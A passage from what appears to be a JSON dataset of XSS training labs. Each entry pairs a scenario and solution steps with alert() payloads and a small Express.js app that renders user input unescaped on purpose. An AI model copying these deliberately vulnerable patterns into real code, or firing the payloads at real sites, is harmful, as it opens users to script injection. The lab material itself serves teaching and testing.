    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet feedbacks = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/product/feedback', (req, res) => {\n  feedbacks.push(req.body.feedback);\n  res.redirect('/thankyou');\n});\napp.get('/admin/feedbacks', (req, res) => {\n  let html = '<html><body><h2>User Feedback</h2>';\n  feedbacks.forEach(f => { html += `<div>${f}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Document Preview Tool",
    "Lab Description": "An internal document preview tool reflects filename input from a query parameter without escaping. Malicious users can inject scripts through this input.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to the document preview URL with a script payload in the query.",
      "Observe script execution in the preview header."
    ],
    "payloads": [
      "<script>alert('Preview XSS')</script>",
      "<img src=x onerror=alert('Preview XSS')>",
      "<svg/onload=alert('Preview XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/preview', (req, res) => {\n  const file = req.query.file;\n  res.send(`<html><body><h3>Previewing: ${file}</h3></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Event Description Field",
    "Lab Description": "A calendar app allows users to create public events with descriptions. The description field is rendered as raw HTML when attendees view the event details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a public event with an XSS payload in the description.",
      "View the event as another user.",
      "Observe script execution from the description content."
    ],
    "payloads": [
      "<script>alert('Event XSS')</script>",
      "<img src=x onerror=alert('Event XSS')>",
      "<svg/onload=alert('Event XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet events = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/event', (req, res) => {\n  events.push({ name: req.body.name, desc: req.body.desc });\n  res.redirect('/events');\n});\napp.get('/events', (req, res) => {\n  let html = '<html><body><h1>Upcoming Events</h1>';\n  events.forEach(e => { html += `<h2>${e.name}</h2><p>${e.desc}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Job Application Message",
    "Lab Description": "A job portal allows applicants to write a personal message to recruiters. These messages are displayed directly in the recruiter's dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit an application with a malicious message.",
      "Login as recruiter and check incoming applications.",
      "Observe XSS execution in message area."
    ],
    "payloads": [
      "<script>alert('Job XSS')</script>",
      "<img src=x onerror=alert('Job XSS')>",
      "<svg/onload=alert('Job XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet apps = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/apply', (req, res) => {\n  apps.push(req.body.message);\n  res.redirect('/thanks');\n});\napp.get('/recruiter/inbox', (req, res) => {\n  let html = '<html><body><h2>Applications</h2>';\n  apps.forEach(a => { html += `<div>${a}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Report Generator Title",
    "Lab Description": "A business intelligence tool takes a title input via URL to label generated reports. This input is reflected on the report view page without sanitization.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Generate a report using a URL with a script in the title parameter.",
      "Observe the script executing in the report page title."
    ],
    "payloads": [
      "<script>alert('Report XSS')</script>",
      "<img src=x onerror=alert('Report XSS')>",
      "<svg/onload=alert('Report XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/report', (req, res) => {\n  const title = req.query.title;\n  res.send(`<html><body><h1>${title}</h1></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Internal Support Chat System",
    "Lab Description": "An internal support tool allows users to send messages to support agents. Messages are stored and rendered directly in the agent's inbox dashboard, exposing them to stored XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a support message with a malicious payload.",
      "Login as a support agent and open the inbox.",
      "Observe the script executing from the message content."
    ],
    "payloads": [
      "<script>alert('Support XSS')</script>",
      "<img src=x onerror=alert('Support XSS')>",
      "<svg/onload=alert('Support XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet messages = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/support/message', (req, res) => {\n  messages.push(req.body.text);\n  res.redirect('/support/thanks');\n});\napp.get('/agent/inbox', (req, res) => {\n  let html = '<html><body><h1>Inbox</h1>';\n  messages.forEach(m => { html += `<p>${m}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Customer Invoice Preview",
    "Lab Description": "A billing portal reflects user-provided invoice notes in the invoice preview URL without escaping input. Attackers can trick users into opening a crafted preview link.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject a payload in the note query parameter.",
      "Open the preview page and observe script execution."
    ],
    "payloads": [
      "<script>alert('Invoice XSS')</script>",
      "<img src=x onerror=alert('Invoice XSS')>",
      "<svg/onload=alert('Invoice XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/invoice/preview', (req, res) => {\n  const note = req.query.note;\n  res.send(`<html><body><h2>Invoice Note: ${note}</h2></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Course Review Submissions",
    "Lab Description": "An online learning platform lets students write course reviews. Reviews are shown to instructors and future students without sanitization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a course review containing an XSS payload.",
      "View the course page or login as instructor to see the review.",
      "Observe the script execution on the course page."
    ],
    "payloads": [
      "<script>alert('Review XSS')</script>",
      "<img src=x onerror=alert('Review XSS')>",
      "<svg/onload=alert('Review XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet reviews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/submit-review', (req, res) => {\n  reviews.push(req.body.review);\n  res.redirect('/courses/1');\n});\napp.get('/courses/1', (req, res) => {\n  let html = '<html><body><h1>Course Reviews</h1>';\n  reviews.forEach(r => { html += `<div>${r}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Contact Form Error Display",
    "Lab Description": "The contact form includes the user's submitted name and subject in error messages when validation fails. These inputs are reflected without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a contact form with an invalid subject and an XSS payload in the name field.",
      "Trigger the error page and observe XSS execution."
    ],
    "payloads": [
      "<script>alert('Contact XSS')</script>",
      "<img src=x onerror=alert('Contact XSS')>",
      "<svg/onload=alert('Contact XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/contact', (req, res) => {\n  const name = req.body.name;\n  const subject = req.body.subject;\n  if (!subject) {\n    res.send(`<html><body><h1>Error: Subject required</h1><p>${name}</p></body></html>`);\n  } else {\n    res.redirect('/thanks');\n  }\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Custom Profile Badge Generator",
    "Lab Description": "A developer forum allows users to design profile badges using HTML snippets. These snippets are rendered as-is in member profiles, enabling persistent XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a badge with embedded XSS payload.",
      "Visit the profile page to see it rendered.",
      "Observe XSS triggering in the badge section."
    ],
    "payloads": [
      "<script>alert('Badge XSS')</script>",
      "<img src=x onerror=alert('Badge XSS')>",
      "<svg/onload=alert('Badge XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet badge = '';\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/profile/badge', (req, res) => {\n  badge = req.body.snippet;\n  res.redirect('/profile');\n});\napp.get('/profile', (req, res) => {\n  res.send(`<html><body><h1>User Profile</h1><div>${badge}</div></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Project Description Field",
    "Lab Description": "A project management tool allows users to update project descriptions. The input is rendered in the project dashboard without sanitization, leading to stored XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Login and navigate to the project settings page.",
      "Submit a new description containing a malicious payload.",
      "Visit the project dashboard and observe script execution."
    ],
    "payloads": [
      "<script>alert('Project XSS')</script>",
      "<img src=x onerror=alert('Project XSS')>",
      "<svg/onload=alert('Project XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet description = 'Initial project overview.';\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/project/update-description', (req, res) => {\n  description = req.body.desc;\n  res.redirect('/project/dashboard');\n});\napp.get('/project/dashboard', (req, res) => {\n  res.send(`<html><body><h1>Project Dashboard</h1><p>${description}</p></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Job Search Portal",
    "Lab Description": "A job board reflects user-provided keywords in the search results page title without encoding. This creates a vector for reflected XSS attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject an XSS payload into the job search query parameter.",
      "Load the search results page and confirm script execution."
    ],
    "payloads": [
      "<script>alert('Search XSS')</script>",
      "<img src=x onerror=alert('Search XSS')>",
      "<svg/onload=alert('Search XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/search', (req, res) => {\n  const q = req.query.q;\n  res.send(`<html><title>${q}</title><body>Results for ${q}</body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in E-commerce Order Notes",
    "Lab Description": "An e-commerce platform allows customers to leave optional notes on orders. These notes are shown to admins in the order panel without any sanitization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit an order with a malicious note.",
      "Login as an admin and view the order.",
      "Observe the execution of the injected script."
    ],
    "payloads": [
      "<script>alert('Order XSS')</script>",
      "<img src=x onerror=alert('Order XSS')>",
      "<svg/onload=alert('Order XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet notes = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/order/submit', (req, res) => {\n  notes.push(req.body.note);\n  res.redirect('/order/confirm');\n});\napp.get('/admin/orders', (req, res) => {\n  let html = '<html><body><h1>Orders</h1>';\n  notes.forEach(n => { html += `<div>${n}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Survey Result Page",
    "Lab Description": "A survey tool displays answers in the result page directly using query parameters. Inputs are not escaped properly, making it vulnerable to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject payload into a survey answer field.",
      "Submit the form and observe the result rendering.",
      "Script should execute on the result page."
    ],
    "payloads": [
      "<script>alert('Survey XSS')</script>",
      "<img src=x onerror=alert('Survey XSS')>",
      "<svg/onload=alert('Survey XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/survey/result', (req, res) => {\n  const answer = req.query.answer;\n  res.send(`<html><body><h2>Your Answer: ${answer}</h2></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in File Sharing App File Titles",
    "Lab Description": "A file sharing service allows users to upload files and set custom titles. The titles are rendered in other users\u00e2\u20ac\u2122 dashboards without sanitization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload a file with a title containing an XSS payload.",
      "Login as another user and view the shared files.",
      "Observe the execution of the injected script."
    ],
    "payloads": [
      "<script>alert('File XSS')</script>",
      "<img src=x onerror=alert('File XSS')>",
      "<svg/onload=alert('File XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet files = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/upload', (req, res) => {\n  files.push(req.body.title);\n  res.redirect('/dashboard');\n});\napp.get('/dashboard', (req, res) => {\n  let html = '<html><body><h1>Shared Files</h1>';\n  files.forEach(f => { html += `<p>${f}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Event Management App Location Field",
    "Lab Description": "An event platform allows users to create events and specify the location. The location is displayed on the public event page without sanitization, making it vulnerable to stored XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create an event and enter an XSS payload in the location field.",
      "Visit the event detail page.",
      "Observe script execution from the stored payload."
    ],
    "payloads": [
      "<script>alert('Location XSS')</script>",
      "<img src=x onerror=alert('Location XSS')>",
      "<svg/onload=alert('Location XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet events = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/event/create', (req, res) => {\n  events.push({ name: req.body.name, location: req.body.location });\n  res.redirect('/event/list');\n});\napp.get('/event/list', (req, res) => {\n  let html = '<html><body><h1>Events</h1>';\n  events.forEach(e => { html += `<div><h3>${e.name}</h3><p>${e.location}</p></div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in User Invitation Email Preview",
    "Lab Description": "An admin portal allows previewing an invitation email before sending. The name field is directly injected into the email preview without proper encoding.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the invitation preview form and insert a payload in the name field.",
      "Click the preview button.",
      "Observe the XSS in the email preview output."
    ],
    "payloads": [
      "<script>alert('Invite XSS')</script>",
      "<img src=x onerror=alert('Invite XSS')>",
      "<svg/onload=alert('Invite XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/invite/preview', (req, res) => {\n  const name = req.query.name;\n  res.send(`<html><body><h2>Email Preview</h2><p>Hello ${name}, you are invited!</p></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Video Platform Commenting System",
    "Lab Description": "A video-sharing platform allows users to comment under videos. Comments are rendered using innerHTML without sanitization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Post a comment with an XSS payload.",
      "Visit the video page as another user.",
      "Observe the payload being executed in the comment section."
    ],
    "payloads": [
      "<script>alert('Comment XSS')</script>",
      "<img src=x onerror=alert('Comment XSS')>",
      "<svg/onload=alert('Comment XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/comment', (req, res) => {\n  comments.push(req.body.text);\n  res.redirect('/video');\n});\napp.get('/video', (req, res) => {\n  let html = '<html><body><h1>Video Title</h1>';\n  comments.forEach(c => { html += `<p>${c}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "DOM-based XSS in Support Ticket Viewer",
    "Lab Description": "A support dashboard reads the ticket title from the URL hash and injects it using innerHTML into the page header without validation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the ticket viewer with a crafted URL containing a payload in the hash.",
      "Observe script execution via DOM-based injection."
    ],
    "payloads": [
      "<script>alert('DOM XSS')</script>",
      "<img src=x onerror=alert('DOM XSS')>",
      "<svg/onload=alert('DOM XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/ticket', (req, res) => {\n  res.send(`<html><body><h1 id='title'></h1><script>document.getElementById('title').innerHTML = location.hash.slice(1);</script></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Portfolio Site Testimonial Submission",
    "Lab Description": "A personal portfolio website allows visitors to submit testimonials. Submissions are stored and displayed in the testimonials section without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a testimonial with an XSS payload.",
      "Visit the homepage and observe execution of the stored script."
    ],
    "payloads": [
      "<script>alert('Testimonial XSS')</script>",
      "<img src=x onerror=alert('Testimonial XSS')>",
      "<svg/onload=alert('Testimonial XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet testimonials = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/submit-testimonial', (req, res) => {\n  testimonials.push(req.body.message);\n  res.redirect('/');\n});\napp.get('/', (req, res) => {\n  let html = '<html><body><h1>My Portfolio</h1><div>';\n  testimonials.forEach(t => { html += `<blockquote>${t}</blockquote>`; });\n  res.send(html + '</div></body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Shopping Cart Coupon Code Input",
    "Lab Description": "An e-commerce site reflects the coupon code directly into the cart confirmation page. The input is inserted into the DOM without escaping, making it vulnerable to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Visit the cart page with a crafted coupon code containing an XSS payload.",
      "Observe the payload being executed in the response."
    ],
    "payloads": [
      "<script>alert('Coupon XSS')</script>",
      "<img src=x onerror=alert('Coupon XSS')>",
      "<svg/onload=alert('Coupon XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/cart', (req, res) => {\n  const code = req.query.coupon;\n  res.send(`<html><body><h1>Your Cart</h1><p>Coupon Applied: ${code}</p></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Online Course Review",
    "Lab Description": "A learning platform lets students leave reviews on courses. Reviews are rendered using raw HTML, and no sanitization is applied to the input.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Post a review containing an XSS payload.",
      "Access the course page as another user.",
      "Observe script execution in the review section."
    ],
    "payloads": [
      "<script>alert('Review XSS')</script>",
      "<img src=x onerror=alert('Review XSS')>",
      "<svg/onload=alert('Review XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet reviews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/review', (req, res) => {\n  reviews.push(req.body.text);\n  res.redirect('/course');\n});\napp.get('/course', (req, res) => {\n  let html = '<html><body><h1>Course Reviews</h1>';\n  reviews.forEach(r => { html += `<div>${r}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "DOM-based XSS in Blog Article Viewer via Location Fragment",
    "Lab Description": "A blog viewer script displays additional notes from the URL fragment. The content is inserted using innerHTML, making it exploitable for DOM-based XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open the blog viewer with a crafted hash payload.",
      "Observe JavaScript execution from the fragment.",
      "Confirm it is injected via DOM methods."
    ],
    "payloads": [
      "<script>alert('Blog XSS')</script>",
      "<img src=x onerror=alert('Blog XSS')>",
      "<svg/onload=alert('Blog XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/blog', (req, res) => {\n  res.send(`<html><body><h1>Blog Article</h1><div id='notes'></div><script>document.getElementById('notes').innerHTML = location.hash.slice(1);</script></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Team Collaboration Chat",
    "Lab Description": "A collaboration tool allows users to send chat messages in a team workspace. Messages are rendered using innerHTML without sanitization, making the system vulnerable to stored XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a crafted message with an XSS payload.",
      "Visit the chat window as another user.",
      "Observe automatic script execution."
    ],
    "payloads": [
      "<script>alert('Chat XSS')</script>",
      "<img src=x onerror=alert('Chat XSS')>",
      "<svg/onload=alert('Chat XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet messages = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/chat/send', (req, res) => {\n  messages.push(req.body.msg);\n  res.redirect('/chat');\n});\napp.get('/chat', (req, res) => {\n  let html = '<html><body><h1>Team Chat</h1>';\n  messages.forEach(m => { html += `<p>${m}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Travel Booking Confirmation Page",
    "Lab Description": "A travel site reflects user names from query parameters on the booking confirmation page. The name is displayed in raw HTML, enabling XSS if not properly encoded.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the booking confirmation URL with a malicious payload in the name parameter.",
      "Confirm that the script is reflected and executed."
    ],
    "payloads": [
      "<script>alert('Booking XSS')</script>",
      "<img src=x onerror=alert('Booking XSS')>",
      "<svg/onload=alert('Booking XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/confirm', (req, res) => {\n  const name = req.query.name;\n  res.send(`<html><body><h1>Thank you ${name} for your booking!</h1></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Password Reset Token Display",
    "Lab Description": "A password reset tool echoes the token from the URL onto the page for debugging. The token is inserted into the DOM using innerHTML, allowing reflected XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Visit the password reset page with a crafted `token` parameter containing a script payload.",
      "Observe the token reflected without encoding and triggering script execution."
    ],
    "payloads": [
      "<script>alert('Token XSS')</script>",
      "<img src=x onerror=alert('Token XSS')>",
      "<svg/onload=alert('Token XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/reset-password', (req, res) => {\n  const token = req.query.token;\n  res.send(`<html><body><h2>Reset your password</h2><div id='token'>Token: ${token}</div></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in e-Learning Quiz Feedback",
    "Lab Description": "An online quiz system lets users leave feedback on questions. Feedback is rendered without escaping input, making it vulnerable to stored XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit feedback containing an XSS payload.",
      "Navigate to the quiz review page.",
      "Observe payload execution."
    ],
    "payloads": [
      "<script>alert('Quiz XSS')</script>",
      "<img src=x onerror=alert('Quiz XSS')>",
      "<svg/onload=alert('Quiz XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet feedbacks = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/feedback', (req, res) => {\n  feedbacks.push(req.body.comment);\n  res.redirect('/quiz');\n});\napp.get('/quiz', (req, res) => {\n  let html = '<html><body><h1>Quiz Feedback</h1>';\n  feedbacks.forEach(f => { html += `<div>${f}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Survey System Result Page",
    "Lab Description": "A survey result page reflects survey answers from the URL query. The answer is written to the DOM directly using innerHTML.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft a URL with a malicious value for the `answer` parameter.",
      "Visit the result page and observe the execution of the payload."
    ],
    "payloads": [
      "<script>alert('Survey XSS')</script>",
      "<img src=x onerror=alert('Survey XSS')>",
      "<svg/onload=alert('Survey XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/survey/result', (req, res) => {\n  const answer = req.query.answer;\n  res.send(`<html><body><h1>Survey Result</h1><div>${answer}</div></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Issue Tracker Comment Section",
    "Lab Description": "An internal issue tracker allows engineers to leave comments. The comments are rendered using raw HTML, enabling XSS via stored payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a comment with an XSS payload.",
      "View the issue page and confirm script execution."
    ],
    "payloads": [
      "<script>alert('Issue XSS')</script>",
      "<img src=x onerror=alert('Issue XSS')>",
      "<svg/onload=alert('Issue XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/issue/comment', (req, res) => {\n  comments.push(req.body.text);\n  res.redirect('/issue');\n});\napp.get('/issue', (req, res) => {\n  let html = '<html><body><h1>Issue Comments</h1>';\n  comments.forEach(c => { html += `<p>${c}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "DOM-based XSS in URL-Based Search Filter",
    "Lab Description": "A product listing page updates the search term from the URL hash and injects it into the DOM using innerHTML without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Load the page with a hash that includes a malicious XSS payload.",
      "Observe DOM-based XSS execution via innerHTML."
    ],
    "payloads": [
      "<script>alert('Search XSS')</script>",
      "<img src=x onerror=alert('Search XSS')>",
      "<svg/onload=alert('Search XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/search', (req, res) => {\n  res.send(`<html><body><h1>Search Products</h1><div id='term'></div><script>document.getElementById('term').innerHTML = location.hash.slice(1);</script></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Blog Comment Reply System",
    "Lab Description": "A blogging platform allows users to reply to comments. Replies are displayed without escaping user input, leading to stored XSS when viewing blog posts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a malicious reply containing an XSS payload.",
      "Visit the post page and observe the payload executing in the context of the page."
    ],
    "payloads": [
      "<script>alert('Reply XSS')</script>",
      "<img src=x onerror=alert('Reply XSS')>",
      "<svg/onload=alert('Reply XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet replies = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/reply', (req, res) => {\n  replies.push(req.body.text);\n  res.redirect('/post');\n});\napp.get('/post', (req, res) => {\n  let html = '<html><body><h1>Post and Replies</h1>';\n  replies.forEach(r => { html += `<div>${r}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Newsletter Preview",
    "Lab Description": "The admin panel of a newsletter system previews email content by reflecting a `preview` parameter in the response. The content is injected directly into a content block using innerHTML.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft a URL to the newsletter preview endpoint with an XSS payload as the `preview` parameter.",
      "Access the URL and observe the payload execution."
    ],
    "payloads": [
      "<script>alert('Preview XSS')</script>",
      "<img src=x onerror=alert('Preview XSS')>",
      "<svg/onload=alert('Preview XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/admin/preview', (req, res) => {\n  const preview = req.query.preview;\n  res.send(`<html><body><h2>Newsletter Preview</h2><div>${preview}</div></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "DOM-based XSS in Job Portal Search",
    "Lab Description": "A job search page updates a results heading based on a keyword from the URL fragment. It inserts the value into the DOM via innerHTML, making it vulnerable to DOM-based XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the job search page with a crafted fragment identifier containing a script payload.",
      "Observe script execution due to unsafe insertion."
    ],
    "payloads": [
      "<script>alert('Job Search XSS')</script>",
      "<img src=x onerror=alert('Job Search XSS')>",
      "<svg/onload=alert('Job Search XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/jobs', (req, res) => {\n  res.send(`<html><body><h2 id='result'></h2><script>document.getElementById('result').innerHTML = location.hash.slice(1);</script></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Event Management Comments",
    "Lab Description": "An event platform allows users to comment on event pages. Comments are stored and rendered without escaping, leading to persistent XSS when others view the page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Post a malicious comment.",
      "View the event page and confirm the XSS payload is executed."
    ],
    "payloads": [
      "<script>alert('Event Comment XSS')</script>",
      "<img src=x onerror=alert('Event Comment XSS')>",
      "<svg/onload=alert('Event Comment XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/event/comment', (req, res) => {\n  comments.push(req.body.message);\n  res.redirect('/event');\n});\napp.get('/event', (req, res) => {\n  let html = '<html><body><h1>Event Page</h1>';\n  comments.forEach(c => { html += `<p>${c}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Online Calculator Input Echo",
    "Lab Description": "A web-based calculator reflects the input expression in the output panel using innerHTML without sanitization. This allows reflected XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit an expression with a script payload in the query string.",
      "Observe the output reflecting the payload and triggering JavaScript."
    ],
    "payloads": [
